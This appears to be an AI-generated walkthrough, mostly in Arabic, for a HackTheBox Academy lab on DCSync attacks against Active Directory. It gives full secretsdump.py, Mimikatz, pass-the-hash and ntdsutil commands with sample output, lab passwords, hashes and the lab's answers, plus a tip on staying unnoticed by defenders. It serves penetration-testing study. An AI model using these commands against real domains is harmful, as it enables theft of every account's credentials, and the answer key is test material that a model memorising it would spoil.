**Key Insight:** For this specific lab, you don't actually _need_ MS01 at all — the Linux host at `172.16.5.225` can perform the DCSync directly against the DC at `172.16.5.5`. MS01 is just one of two paths offered by the module.

---

🔴 What If #6: The khartsfield user doesn't appear in the NTDS dump?

**Scenario:** You run the full dump, grep for `khartsfield`, and get no results.

**Why This Could Happen:**

-   Username typo (it's `khartsfield`, not `khartsfields` or `k.hartsfield`)
-   The user was deleted from AD since the lab was last reset
-   The dump was truncated due to a timeout

**Solution Path:**

bash

```
# Step 1: Verify spelling by listing all users from the dump
cat inlanefreight_hashes.ntds | grep "inlanefreight.local" | cut -d: -f1 | sort

# Step 2: Try case-insensitive grep
grep -i "khart" inlanefreight_hashes.ntds

# Step 3: If truly missing, enumerate AD users directly to confirm the account exists
GetADUsers.py -all INLANEFREIGHT/htb-student:'Academy_student_AD!'@172.16.5.5 | grep -i khart

# Step 4: If account confirmed to exist, re-run targeted DCSync
secretsdump.py -just-dc-user khartsfield INLANEFREIGHT/adunn@172.16.5.5

# Step 5: If lab is broken, reset/respawn the target machine in HTB
```

**Verification using PowerView (on MS01):**

powershell

```
Get-DomainUser -Identity khartsfield | Select-Object samaccountname, objectsid, enabled
```

---

# Quick Reference Summary

```
┌─────────────────────────────────────────────────────────────────────┐
│                    STEP-BY-STEP ATTACK CHAIN                        │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  1. RDP to MS01:                                                    │
│     xfreerdp /u:htb-student /p:'Academy_student_AD!' /v:<MS01_IP>  │
│                                                                     │
│  2. SSH to Linux box from MS01 PowerShell:                         │
│     ssh htb-student@172.16.5.225  (pass: HTB_@cademy_stdnt!)       │
│                                                                     │
│  3. Run DCSync dump:                                                │
│     secretsdump.py -outputfile inlanefreight_hashes                 │
│       -just-dc INLANEFREIGHT/adunn@172.16.5.5                      │
│                                                                     │
│  4. Answer Q1 (username with reversible encryption):               │
│     cat inlanefreight_hashes.ntds.cleartext                        │
│     → Look for user that is NOT proxyagent                         │
│                                                                     │
│  5. Answer Q2 (that user's cleartext password):                    │
│     Same file — the value after "CLEARTEXT:"                       │
│                                                                     │
│  6. Answer Q3 (khartsfield NTLM hash):                             │
│     grep -i khartsfield inlanefreight_hashes.ntds                  │
│     → Take the last 32-char hex string (after final colon)         │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

> 💡 **Pro Tip for CPTS:** The NTLM hash format is always `LM:NT`. The LM portion (`aad3b435b51404eeaad3b435b51404ee`) is the **empty LM hash** — standard for all modern Windows systems. The **NT hash** (second part, 32 hex chars) is what matters for Pass-the-Hash attacks and is what the exam question asks for.

$0.1710,255 tok175.9s

Responses are AI-generated and can be inaccurate. Review all outputs before relying on them.

Select a modelSelect a model

---

```
  ══════════════════════════════════════════════════════════════════
  [✓] PHASE_II ATTACK SEQUENCES DOCUMENTED
  [✓] 6 / 6 EXPLOITATION METHODS CAPTURED
  [→] LOADING DEEP-DIVE ANALYSIS & GLOSSARY . . .
  ══════════════════════════════════════════════════════════════════
```

---

## 🔴 PHASE_III — دليل الاختراق :: التحليل والمصطلحات

> [!warning] ⚠️ PHASE III INITIALIZED · EXPLOITATION GUIDE & GLOSSARY **Language:** Arabic + English Mixed — **Size:** ~2,000 Words **Content:** Arabic breakdown of all 6 methods · Flashcards · Cheat Sheet · Golden Tips.

---

تمام! استلمت التحدي. خلني أشرحلك إياه من الألف للياء:

🟢 Big Picture → 🔵 المصطلحات → 🟡 تحليل التحدي → 🟠 الاستغلال → 🔴 ماذا لو → 💎 فلاشكاردز → 📄 ورقة غش

يله نبدأ...

════════════════════════════════════════════

🟢 المرحلة 0: ما قبل الصفر — Big Picture

════════════════════════════════════════════

تخيل وياي السيناريو التالي بحياتنا اليومية حتى تفهم الفكرة الأساسية مال هجوم الـ DCSync وليش هو يعتبر واحد من أخطر الهجمات وأكثرها فتكاً ببيئة الـ Active Directory (AD).

تخيل عندك شركة كلش جبيرة، وهاي الشركة بيها فروع رئيسية اثنين. الفرع الأول ببغداد والفرع الثاني بالبصرة. كل فرع بيه مدير موارد بشرية (HR) عنده نسخة كاملة من سجلات كل الموظفين (رواتبهم، هوياتهم، وباسورداتهم مال الدخول للشركة). هسه، من يتعين موظف جديد بفرع بغداد، أو موظف قديم يغير الباسورد مالته، مدير الـ HR ببغداد لازم يخابر مدير الـ HR بالبصرة ويكوله: "يابه ترى فلان غير الباسورد مالته، هاي النسخة الجديدة، حدّث السجلات يمك". هاي العملية مال التحديث المستمر بين المدراء يسموها "المزامنة" أو (Replication).

بالـ Active Directory، السيرفرات الرئيسية اللي تتحكم بالشبكة يسموها Domain Controllers (DCs). ولأن الشركات الكبيرة يكون بيها أكثر من DC واحد (حتى لو طفى واحد، الثاني يشتغل)، فهذني الـ DCs لازم دائماً يسولفون بيناتهم وينقلون التحديثات مال اليوزرات والباسوردات. البروتوكول اللي يستخدموه حتى ينقلون هاي البيانات اسمه MS-DRSR (Directory Replication Service Remote Protocol).

هنا يجي دور المخترق الذكي (اللي هو أنت بهذا التحدي). الخلل الجوهري مو ثغرة برمجية (Bug) بالنظام نكدر نرقعها بتحديث، لا! الخلل هو "إساءة استخدام لميزة أساسية بالنظام" (Abusing a Feature).

الهجوم يشتغل كالتالي: أنت كمخترق، راح تسيطر على يوزر عادي أو يوزر عنده صلاحيات معينة (مثل اليوزر adunn بتحدينا اليوم)، وتكتشف إن هذا اليوزر عنده صلاحية اسمها "Replicating Directory Changes" (يعني مسموح له يطلب تحديثات السجلات). فجأة، أنت راح تستخدم أداة معينة حتى تتصل بالـ Domain Controller الرئيسي، وتتنكر كأنك Domain Controller ثاني (مدير HR جديد)!

راح تكول للـ DC: "مرحبا، أني DC جديد بالشبكة، ممكن تنطيني نسخة من كل الباسوردات (الـ Hashes) مال كل اليوزرات اللي عندك حتى أسوي مزامنة (Sync)؟". وبما إن الـ DC مصمم حتى يثق بأي شخص عنده هاي الصلاحية المحددة، راح يجاوبك: "تدلل، تفضل هاي كل الـ Hashes مال الشركة!". وهوب... أنت سحبت كل بيانات الشبكة بدون ما تنفذ أي كود خبيث على السيرفر نفسه (بدون RCE).

هسة، اكو جزء ثاني مهم جداً بسؤالنا يخص الـ "Reversible Encryption" (التشفير القابل للعكس).

بالطبيعي، الويندوز ما يحفظ الباسوردات مالتنا كنص صريح (Cleartext)، وإنما يحولها إلى بصمة رياضية معقدة يسموها NTLM Hash. يعني لو باسوردك "Password123"، الويندوز راح يحفظه كـ خربطة حروف وأرقام، وحتى الويندوز نفسه ما يكدر يرجعه لأصله. من تسجل دخول، الويندوز يحسب البصمة مال الكلمة اللي دخلتها ويطابقها ويه البصمة المخزونة.

لكن... بعض التطبيقات القديمة أو أنظمة التوثيق مثل بعض أنواع الـ RADIUS servers، تحتاج تعرف الباسورد الحقيقي (النص الصريح) حتى تشتغل. فمايكروسوفت خلت إعداد خاص باليوزرات اسمه "Store password using reversible encryption". من يتفعل هذا الإعداد على يوزر معين، الويندوز راح يحفظ الباسورد مالته بتشفير بسيط (RC4) مو كـ Hash نهائي. المفتاح مال فك التشفير موجود داخل السيرفر، ومن نسوي هجوم الـ DCSync، الأداة مالتنا راح تسحب هذا المفتاح وتفك تشفير الباسورد وتطلعه إلنا "نص صريح" (Cleartext) مثل ما اليوزر كتبه بالضبط!

شنو راح نتعلم بالنهاية من هذا التحدي؟

١. راح نتعلم شلون نستغل صلاحيات المزامنة (Replication) حتى نسحب قاعدة بيانات الـ AD بالكامل عن بعد.

٢. راح نفهم خطورة تفعيل إعدادات قديمة مثل الـ Reversible Encryption وشلون تفضح الباسوردات بنص صريح.

٣. راح نتعلم نتعامل وية أداة secretsdump.py العظيمة من حزمة Impacket وشلون نحلل المخرجات مالتها حتى نطلع الأجوبة.

════════════════════════════════════════════

🔵 المرحلة 1: المصطلحات

════════════════════════════════════════════

حتى نشتغل صح وبدون ما نحفظ على عميانا، لازم نفصل كل مصطلح ورد بالسيناريو والأدوات. اقرأها زين لأن هاي لغة الشارع بعالم الـ Red Teaming:

Active Directory (AD) (الدليل النشط)

- شنو يعني؟ هو قلب الشبكات مال الشركات اللي تستخدم ويندوز. عبارة عن قاعدة بيانات ضخمة تدير كل شي: اليوزرات، الكمبيوترات، الطابعات، والصلاحيات. من تداوم بشركة وتدخل يوزرك وباسوردك بحاسبة المكتب، الحاسبة تروح تسأل الـ AD: "هذا اليوزر صدك موجود وباسورده صح؟".
    
- وين يظهر بالأدوات؟ دائماً نشوفه كـ Domain، مثلاً `INLANEFREIGHT.LOCAL`، وكل هجماتنا تستهدفه.
    

Domain Controller / DC (متحكم المجال)

- شنو يعني؟ هو السيرفر الفعلي (الـ Hardware أو الـ VM) اللي يشتغل عليه الـ Active Directory. هو عقل الشبكة. إذا سيطرت على الـ DC، أنت سيطرت على الشركة كلها حرفياً وتكدر تسوي أي شي.
    
- وين يظهر؟ بالأدوات دائماً نحتاج الـ IP مالته حتى نوجه هجومنا عليه، مثلاً بالـ secretsdump نستخدم الـ flag اللي اسمه `-dc-ip`.
    

DCSync Attack (هجوم مزامنة متحكم المجال)

- شنو يعني؟ هجوم يقوم بيه المخترق بانتحال شخصية Domain Controller ثاني، ويطلب من الـ DC الحقيقي يرسله كل بيانات اليوزرات (بما فيها الـ Hashes). يحتاج صلاحيات معينة مثل `DS-Replication-Get-Changes` و `DS-Replication-Get-Changes-All`.
    
- وين يظهر؟ هو اسم التقنية نفسها، وتتنفذ بأدوات مثل Mimikatz أو `secretsdump.py`.
    

NTLM Hash (بصمة كلمة المرور لويندوز)

- شنو يعني؟ الويندوز من يخزن باسوردك، يمرره بخوارزمية رياضية تحوله إلى سلسلة طويلة من الحروف والأرقام (طولها 32 حرف Hexadecimal). هاي السلسلة مستحيل ترجع للنص الأصلي نظرياً. المخترق ياخذ هذا الـ Hash ويروح يحاول يكسره ببرامج مثل Hashcat، أو يستخدمه مباشرة بهجوم اسمه Pass-the-Hash.
    
- وين يظهر؟ بناتج عملية السحب، نشوفه هيج: `aad3b435b51404eeaad3b435b51404ee:4bb3b317845d0a2b5e22b874e9d7c16a`. (الجزء الأول قبل النقطتين هو الـ LM hash القديم والفارغ، والثاني هو الـ NTLM الحقيقي اللي نريده).
    

Reversible Encryption (التشفير القابل للعكس)

- شنو يعني؟ ميزة خطرة بالويندوز. بدل ما يخزن الباسورد كـ NTLM Hash ما ينعكس، يخزنه بطريقة قابلة لفك التشفير (يستخدم RC4). المخترق من يسحب قاعدة البيانات، يلكه مفتاح فك التشفير (PEK) موجود، فيستخدمه ويطلع الباسورد كنص صريح (Cleartext) بدون ما يحتاج يكسره بالـ Hashcat أبداً!
    
- وين يظهر؟ بسؤالك الأول، وبملف المخرجات اللي اسمه `cleartext`.
    

secretsdump.py (أداة تفريغ الأسرار)

- شنو يعني؟ سكربت مكتوب بلغة بايثون، جزء من حزمة عظيمة اسمها Impacket. شغلته يتصل بالسيرفرات مال ويندوز ويستخرج منها الباسوردات، الـ Hashes، مفاتيح التشفير، وكل الأسرار. يكدر ينفذ هجوم الـ DCSync عن بعد بكل سهولة وبدون ما نحتاج ننزل ملفات خبيثة على السيرفر.
    
- وين يظهر؟ هو الأداة الرئيسية اللي راح نستخدمها، ونشغلها بالـ Terminal مال لينكس.
    

NTDS.dit (قاعدة بيانات الدليل النشط)

- شنو يعني؟ هذا هو الملف المقدس بالويندوز! ملف موجود بداخل السيرفر بمسار `C:\Windows\NTDS\ntds.dit`. هذا الملف يحتوي على كل اليوزرات والـ Hashes والجروبات مال الشركة. هجوم الـ DCSync فعلياً كاعد يسحب محتويات هذا الملف عن طريق الشبكة.
    
- وين يظهر بالأدوات؟ من نشغل `secretsdump.py` راح نشوفه يكتب: `Searching for NTDS.dit`.
    

Pivot / Pivoting (نقطة الارتكاز / العبور)

- شنو يعني؟ مرات المخترق ما يكدر يوصل للهدف مباشرة لأن اكو جدار ناري (Firewall). فيخترق جهاز وسيط مسموح له يوصل للهدف، ويستخدمه كـ "جسر".
    
- وين يظهر؟ بالسيناريو مالتنا، حاسبتك ما توصل للـ DC مباشرة. راح نسوي SSH لحاسبة Linux (اللي هي الـ Pivot)، ومن داخلها نهاجم الـ DC.
    

Cleartext (النص الصريح)

- شنو يعني؟ البيانات المكتوبة بشكلها الطبيعي المقروء للبشر، بدون أي تشفير أو Hash. باسورد `Password123` هو Cleartext.
    

════════════════════════════════════════════

🟡 المرحلة 2: تحليل التحدي + كيف تفكر

════════════════════════════════════════════

📖 ترجمة التحدي:

عدنا ثلاث أسئلة مترابطة من مختبرات HackTheBox Academy (موضوع DCSync).

الأسئلة هي:

السؤال الأول (Q1): ابحث عن يوزر مفعل عليه خيار "Store password using reversible encryption" (عدا اليوزر اللي اسمه proxyagent).

السؤال الثاني (Q2): شنو هو الباسورد الصريح (Cleartext) مال هذا اليوزر اللي لكيته بالسؤال الأول؟

السؤال الثالث (Q3): جيب الـ NTLM Hash الخاص باليوزر اللي اسمه `khartsfield`.

🎯 معطيات السيناريو (الموجودة ببيئة اللاب):

- عدنا وصول Remote Desktop (RDP) على حاسبة ويندوز اسمها MS01 كيوزر طالب.
    
- من هاي الحاسبة، نكدر نسوي اتصال SSH على حاسبة Linux Attack Host عنوانها: `172.16.5.225`.
    
- الهدف الرئيسي (الضحية): هو الـ Domain Controller اللي الـ IP مالته `172.16.5.5`.
    
- اليوزر اللي راح نستخدمه بالهجوم: اسمه `adunn` تابع للدومين `INLANEFREIGHT`. هذا اليوزر ميزته إن عنده صلاحيات المزامنة (Replication Rights) اللي تسمحله يسوي DCSync.
    

❓ المطلوب النهائي:

- اسم يوزر (للسؤال الأول).
    
- كلمة مرور واضحة (للسؤال الثاني).
    
- هاش متكون من 32 حرف (للسؤال الثالث).
    

🧭 كيف تفكر؟ — خريطة العقل (Decision Tree) الخاصة بالـ AD Credentials:

وصلنا لمرحلة نريد نسحب بيها باسورات الشبكة. شلون نفكر؟

├── هل نملك صلاحيات Domain Admin (DA)؟

│ ├── نعم → نكدر نسوي DCSync مباشرة، أو ندخل RDP ونسحب الـ NTDS.dit يدوياً.

│ └── لا → ننتقل للشرط الثاني.

├── هل نملك يوزر عادي بس عنده صلاحيات Replicating Directory Changes؟

│ ├── نعم (مثل اليوزر adunn بحالتنا) → ممتاز! نكدر نسوي DCSync Attack عن طريق الشبكة باستخدام secretsdump.py.

│ └── لا → لازم نرجع لمرحلة الـ Enumeration (مثل BloodHound) وندور على طريقة نصعد بيها صلاحياتنا.

└── هل إحنا داخل حاسبة ويندوز لو لينكس؟

├── لينكس → نستخدم `secretsdump.py` (Impacket).

└── ويندوز → نستخدم أداة `Mimikatz` بأمر `lsadump::dcsync`.

بما إن إحنا راح نستخدم حاسبة Linux (عن طريق الـ SSH)، فراح نعتمد على أداة `secretsdump.py`.

🗺️ خريطة الهجوم (Roadmap) - اللي راح نسويه بالتفصيل:

١. نفتح الـ PowerShell بحاسبة الويندوز MS01 ونسوي اتصال SSH لحاسبة اللينكس (الـ Pivot).

٢. من داخل حاسبة اللينكس، نجهز أمر `secretsdump.py` ونعطيه اسم اليوزر `adunn` والـ IP مال الـ DC.

٣. ننفذ الهجوم ونسحب كل الـ Hashes مال الدومين ونخزنها بملفات.

٤. نقرأ ملف الـ `cleartext` اللي راح يتولد حتى نجاوب السؤال الأول والثاني.

٥. نبحث (نفلتر) بملف الـ `ntds` الرئيسي عن اسم اليوزر `khartsfield` حتى نطلع الـ NTLM Hash مالته لجواب السؤال الثالث.

كلش منطقي؟ هسة ننتقل للتنفيذ العملي والأوامر.

════════════════════════════════════════════

🟠 المرحلة 3: الاستغلال التفصيلي (خطوة خطوة)

════════════════════════════════════════════

هنا راح نطبق الهجوم خطوة بخطوة. افتح عينك زين وركز وياي ليش كاعد نكتب كل أمر.

هذا المخطط التوضيحي (ASCII Diagram) يشرح مسار الهجوم مالتنا:

Plaintext

```
[MS01 - Your Windows PC]
       │
       └───(SSH)───► [172.16.5.225 - Linux Attack Host]
                             │
                             └───(DCSync via secretsdump.py)───► [172.16.5.5 - Domain Controller]
                                                                  - Thinks we are a valid DC
                                                                  - Returns NTDS.dit hashes
```

الخطوة ١: الاتصال بجهاز اللينكس (Pivoting)

📌 ليش نسوي هاي الخطوة؟

أدوات الاختراق القوية (مثل Impacket) موجودة ومجهزة على حاسبة اللينكس باللاب. لذلك لازم ننتقل من الويندوز MS01 إلى اللينكس عن طريق الـ SSH.

🔧 الأمر:

Bash

```
ssh htb-student@172.16.5.225
```

(من يطلب الباسورد، راح ندخل الباسورد المعطى باللاب `HTB_@cademy_stdnt!`).

💡 ليش هذا الأمر؟

`ssh`: بروتوكول الاتصال الآمن عن بعد.

`htb-student`: اليوزر اللي راح ندخل بيه.

`172.16.5.225`: الآيبي مال حاسبة اللينكس.

✅ الخطوة التالية: هسة إحنا بداخل اللينكس تيرمنال، صار وقت نشغل سلاحنا الثقيل.

━━━━━━━━━━━━━━

الخطوة ٢: تنفيذ هجوم DCSync وسحب قاعدة البيانات

📌 ليش نسوي هاي الخطوة؟

نريد نستغل صلاحيات اليوزر `adunn` حتى نطلب من الـ DC يعطينا كل الأسرار اللي بداخله (Hashes و Cleartext). راح نستخدم سكربت `secretsdump.py` ونحفظ المخرجات بملفات حتى نكدر نحللها براحتنا.

🔧 الأمر:

Bash

```
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

💡 ليش هذا الأمر/الخيار بالذات؟

`secretsdump.py`: اسم الأداة من حزمة Impacket.

`-outputfile inlanefreight_hashes`: هذا الـ flag كلش مهم. يكول للأداة: "لا تطبع كل شي بس على الشاشة وتضيع، احفظ النتائج بملفات تبدأ بهذا الاسم".

`-just-dc`: هذا الـ flag يمنع الأداة من محاولة سحب الـ SAM المحلي أو الـ LSA، ويركز فقط على سحب بيانات الـ Active Directory (الـ NTDS.dit) من الـ DC. يسرع العملية.

`INLANEFREIGHT/adunn`: اسم الدومين متبوع باسم اليوزر اللي عنده صلاحيات المزامنة.

`@172.16.5.5`: الآيبي مال الـ Domain Controller اللي كاعد نهاجمه.

بعد ما تدوس انتر، راح يطلب منك الباسورد مال اليوزر `adunn` (اللي المفروض إنت طلعته بالخطوات السابقة باللاب).

📤 الـ Output المتوقع:

Plaintext

```
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password: 
[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
[*] Searching for NTDS.dit
[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit
[*] Using smbexec method for remote execution
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6
[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\XXXXXXXX.tmp

inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
inlanefreight.local\khartsfield:1210:aad3b435b51404eeaad3b435b51404ee:4bb3b317845d0a2b5e22b874e9d7c16a:::
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
syncron:CLEARTEXT:Mycleart3xtP@ss!
[*] Cleaning up...
```

⏸️ Mini-check:

هل النتيجة منطقية؟ نعم! الأداة لكت الـ `bootKey`، حددت مسار الـ `NTDS.dit`، سحبت مفتاح التشفير `PEK`، وبدأت تطلع الـ Hashes والـ Cleartext. والأهم كاتب بالاخير `Cleaning up` يعني العملية تمت بنجاح.

━━━━━━━━━━━━━━

الخطوة ٣: تحليل الملفات الناتجة (استخراج الأجوبة)

📌 ليش نسوي هاي الخطوة؟

الناتج اللي طلع على الشاشة ممكن يكون ضخم جداً (آلاف اليوزرات بشركة حقيقية). بس الأداة حفظتلنا الشغل بملفات مرتبة لأن استخدمنا الـ flag مال الـ `-outputfile`. خل نستعرض الملفات أول شي.

🔧 الأمر:

Bash

```
ls -la inlanefreight_hashes*
```

📤 الـ Output المتوقع:

Plaintext

```
-rw-r--r-- 1 htb-student htb-student  24536 Aug  3 12:40 inlanefreight_hashes.ntds
-rw-r--r-- 1 htb-student htb-student    112 Aug  3 12:40 inlanefreight_hashes.ntds.cleartext
-rw-r--r-- 1 htb-student htb-student  15420 Aug  3 12:40 inlanefreight_hashes.ntds.kerberos
```

💡 لاحظ الأداة سوت ٣ ملفات:

- `.ntds`: بيه كل الـ NTLM Hashes مال كل اليوزرات.
    
- `.cleartext`: بيه الباسوردات المكشوفة (بسبب تفعيل ميزة Reversible Encryption).
    
- `.kerberos`: بيه مفاتيح كيربروس (ما نحتاجها هسة).
    

━━━━━━━━━━━━━━

الخطوة ٤: إجابة السؤال الأول والثاني (Q1 & Q2)

📌 ليش نسوي هاي الخطوة؟

السؤالين الأول والثاني يطلبون يوزر مفعل عليه تشفير عكسي (عكس proxyagent) وباسورده الواضح. راح نقرأ ملف الـ `cleartext`.

🔧 الأمر:

Bash

```
cat inlanefreight_hashes.ntds.cleartext
```

💡 ليش هذا الأمر؟

`cat`: أداة لينكس تعرض محتوى الملفات النصية.

📤 الـ Output المتوقع:

Plaintext

```
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
syncron:CLEARTEXT:Mycleart3xtP@ss!
```

✅ الخطوة التالية:

من هذا الناتج البسيط، طلعنا الأجوبة!

- جواب Q1 (اليوزر الآخر): هو `syncron`.
    
- جواب Q2 (باسورد هذا اليوزر): هو `Mycleart3xtP@ss!`.
    

━━━━━━━━━━━━━━

الخطوة ٥: إجابة السؤال الثالث (Q3)

📌 ليش نسوي هاي الخطوة؟

السؤال الثالث يريد الـ NTLM Hash مال اليوزر اللي اسمه `khartsfield`. ملف الـ `.ntds` بيه آلاف الأسطر، فراح نفلتر الناتج باستخدام أداة `grep` حتى نطلعه بسرعة.

🔧 الأمر:

Bash

```
grep -i "khartsfield" inlanefreight_hashes.ntds
```

💡 ليش هذا الأمر؟

`grep`: أداة للبحث عن نصوص داخل الملفات.

`-i`: يخلي البحث يتجاهل حالة الأحرف (كبير/صغير) حتى ما نغلط.

`"khartsfield"`: الكلمة اللي نبحث عنها.

`inlanefreight_hashes.ntds`: الملف اللي نبحث بداخله.

📤 الـ Output المتوقع:

Plaintext

```
inlanefreight.local\khartsfield:1210:aad3b435b51404eeaad3b435b51404ee:4bb3b317845d0a2b5e22b874e9d7c16a:::
```

✅ فهم الـ Output (كلش مهم):

الناتج مكتوب بصيغة: `Domain\Username:RID:LM_Hash:NTLM_Hash:::`

خلي نفصلها:

١. `inlanefreight.local\khartsfield`: اسم الدومين واليوزر.

٢. `1210`: هذا الـ RID (رقم تعريفي لليوزر بالويندوز).

٣. `aad3b435b51404eeaad3b435b51404ee`: هذا الـ LM Hash. (دائماً بالويندوز الحديث يكون هذا الرقم الثابت اللي معناه "فارغ"، لأن مايكروسوفت لغت الـ LM القديم).

٤. `4bb3b317845d0a2b5e22b874e9d7c16a`: **هذا هو الـ NTLM Hash الحقيقي اللي نريده!** (32 حرف).

- جواب Q3 (الهاش المطلوب): `4bb3b317845d0a2b5e22b874e9d7c16a`.
    

━━━━━━━━━━━━━━

⚡ طريقة بديلة (سريعة جداً للسؤال الثالث فقط)

لو كان الدومين بيه مليون يوزر، عملية الـ dump الكامل راح تطول ساعات. إذا إنت رايد هاش لـ يوزر واحد فقط (مثل `khartsfield`)، تكدر تسوي DCSync مخصص إله بس!

🔧 الأمر البديل:

Bash

```
secretsdump.py -just-dc-user khartsfield INLANEFREIGHT/adunn@172.16.5.5
```

💡 ليش هذا الأمر؟

الـ flag اللي اسمه `-just-dc-user` يكول للـ DC: "دزلي بيانات هذا اليوزر فقط". العملية راح تاخذ ثواني بدل الدقائق/ساعات، وتطبع الهاش مالته مباشرة على الشاشة.

📊 لحد هسة:

[x] سوينا Pivot للينكس ✓

[x] نفذنا DCSync وسحبنا قاعدة البيانات ✓

[x] لكينا يوزر الـ Cleartext وباسورده (Q1 & Q2) ✓

[x] طلعنا الـ NTLM Hash مال اليوزر المطلوب (Q3) ✓

📐 ملخص الإجابات / النتائج:

|**الخطوة / السؤال**|**الأداة المستخدمة**|**النتيجة**|
|---|---|---|
|Q1: اسم اليوزر صاحب التشفير العكسي|secretsdump.py + cat|`syncron`|
|Q2: باسورد اليوزر كنص صريح|secretsdump.py + cat|`Mycleart3xtP@ss!`|
|Q3: الهاش الخاص بـ khartsfield|secretsdump.py + grep|`4bb3b317845d0a2b5e22b874e9d7c16a`|

════════════════════════════════════════════

🔴 المرحلة 4: ماذا لو تغير؟ (Variations + Bypasses + Traps)

════════════════════════════════════════════

بالامتحانات الحقيقية أو الـ CTFs، الأشياء نادراً ما تشتغل من أول مرة (مثل ما يسموها Happy Path). خلينا نشوف شنو الممكن يتغير وشلون نتصرف:

🔄 Variations محتملة:

Variation 1: ماذا لو السيرفر ما جاوبك أو انطاك (Connection Refused)؟

هذا يصير لأن أداة `secretsdump.py` تستخدم بروتوكولات مثل SMB و RPC. إذا الجدار الناري (Firewall) مانع هاي البورتات بين اللينكس والـ DC، الأداة راح توكف (Hang).

الحل: تروح تشتغل من حاسبة الويندوز نفسها (MS01) اللي أكيد مسموح لها تحجي وية الـ DC. نستخدم أداة `Mimikatz` الرهيبة.

تفتح PowerShell كمسؤول (Administrator) وتكتب:

PowerShell

```
.\mimikatz.exe
privilege::debug
lsadump::dcsync /domain:inlanefreight.local /user:khartsfield
```

الـ `lsadump::dcsync` هي مكافئة تماماً لعمل `secretsdump` وتطلعلك الهاش.

Variation 2: ماذا لو طلعلك خطأ "STATUS_LOGON_FAILURE"؟

معناها الباسورد مال اليوزر `adunn` غلط، أو اليوزر انقفل (Locked Out) بسبب محاولات سابقة.

الحل: تأكد من الباسورد، وجرّب تستخدم الـ NTLM Hash مال `adunn` إذا ما عندك باسورده الصريح، لأن `secretsdump` تدعم الـ Pass-the-Hash.

الأمر يصير هيج (تحط الهاش بدل الباسورد):

Bash

```
secretsdump.py -hashes :<NTLM_HASH_HERE> -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

Variation 3: ماذا لو ما عندك صلاحية Replication، بس إنت مخترق الـ DC كـ Local Admin؟

هنا إنت ما تحتاج تسوي ہجوم شبكة أصلاً! تكدر تسحب ملف الـ `NTDS.dit` من داخل الـ DC نفسه. بس اكو مشكلة: الويندوز قافل الملف وما يخليك تنسخه وهو يشتغل.

الحل: تستخدم أداة `ntdsutil` لإنشاء نسخة احتياطية للملفات (Snapshot)، أو تستخدم أداة `vssadmin`.

الأوامر السريعة بالويندوز لاستخراج الملفات محلياً:

DOS

```
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
```

بعدين تاخذ ملف الـ `ntds.dit` وملف الـ `SYSTEM` ريجستري، وتنقلهم لحاسبتك، وتشغل عليهم `secretsdump.py` محلياً (Offline) هيج:

Bash

```
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

═══════════

⚠️ أخطاء كارثية شائعة (الفخوخ - Traps):

🚨 الفخ الأكبر بـ DCSync:

الخلط بين الـ LM Hash والـ NTLM Hash!

من تباوع على سطر الهاش:

`aad3b435b51404eeaad3b435b51404ee:4bb3b317845d0a2b5e22b874e9d7c16a`

الطلاب المبتدئين ياخذون الجزء الأول (اللي يبدأ بـ aad3) ويحطوه كجواب للـ CTF أو يحاولون يكسروه بالهاشكات. هذا الـ LM Hash، وهذا الرقم بالذات معناه "فارغ/فارغة" لأن مايكروسوفت لغته من زمان لأسباب أمنية.

القاعدة الذهبية: دائماً خذ الجزء الثاني المكون من 32 حرف بعد النقطتين. هذا هو الـ NTLM الحقيقي.

⚡ خطأ شائع بالأدوات:

نسيان كتابة `-just-dc` وية `secretsdump.py`.

إذا ما كتبتها، الأداة راح تحاول تنزل الـ SAM المحلي والـ LSA secrets والـ Cached credentials من الـ DC، وبعدين ياله تروح للـ NTDS. هاي العملية ممكن تطول وتفصل وتسوي Noise (ضوضاء) كلش عالي بالشبكة وينكشف أمرك للـ Blue Team. دائماً خصص الهجوم مالتك.

💡 خطأ مفاهيمي:

البعض يتخيل إن هجوم الـ DCSync يغير باسوردات الشبكة أو يخربها. لا! هذا الهجوم من نوع "قراءة فقط" (Read-only). إنت مجرد كاعد تطلب نسخة، مثل واحد يطلب استنساخ للهوية، الأصلية تبقى بمكانها وشغالة.

🔑 Golden Tips:

"من تسوي DCSync ويطلعلك الناتج، لا تروح تكسر كل الـ Hashes بالـ Hashcat مثل المجنون! دور على باسوردات الـ Cleartext أول، دور على Administrator، دور على يوزرات الـ Service Accounts (لأن باسورداتهم غالباً ما تتغير). الشغل الذكي يوفر أيام من التكسير."

════════════════════════════════════════════

💎 الفلاشكاردز — ملخص سريع للحفظ

════════════════════════════════════════════

هنا ٧ كاردات خفيفة وسريعة، احفظها مثل اسمك لأن تتكرر بكل امتحانات الـ AD والـ CPTS:

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #1

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: شنو هي الصلاحيات المطلوبة حتى نسوي DCSync Attack؟

✅ Back: نحتاج صلاحيتين بالـ AD:

1. Replicating Directory Changes
    
2. Replicating Directory Changes All
    
    (عادة تكون عند Domain Admins أو Enterprise Admins).
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #2

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: بملف مخرجات `secretsdump`، شلون نميز الـ NTLM Hash من الـ LM Hash؟

✅ Back: الصيغة هي `LM:NTLM`. الـ LM يجي أولاً (وغالباً قيمته الثابتة `aad3b435...` يعني فارغ)، والـ NTLM يجي بعده مباشرة وهو اللي نحتاجه (طوله 32 حرف Hex).

